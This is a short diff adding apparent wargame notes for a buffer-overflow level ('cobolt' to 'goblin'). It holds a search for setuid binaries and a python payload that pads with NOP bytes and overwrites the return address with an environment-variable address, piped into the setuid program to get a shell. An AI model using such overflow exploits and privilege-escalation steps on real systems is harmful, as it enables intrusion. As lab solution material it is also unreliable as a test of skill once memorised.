@@ -1,0 +1,12 @@
+[cobolt@localhost cobolt]$ find / -user goblin \( -perm -u+s -o -perm -g+s \) 2>/dev/null
+/home/cobolt/goblin
+
+
+env : 0xbffffa7f
+payload = 20 + ret
+
+python -c 'print "\x90"*20 + "\x7f\xfa\xff\xbf"'
+
+###################
+(python -c 'print "\x90"*20 + "\x7f\xfa\xff\xbf"';cat) | ./goblin 
+###################
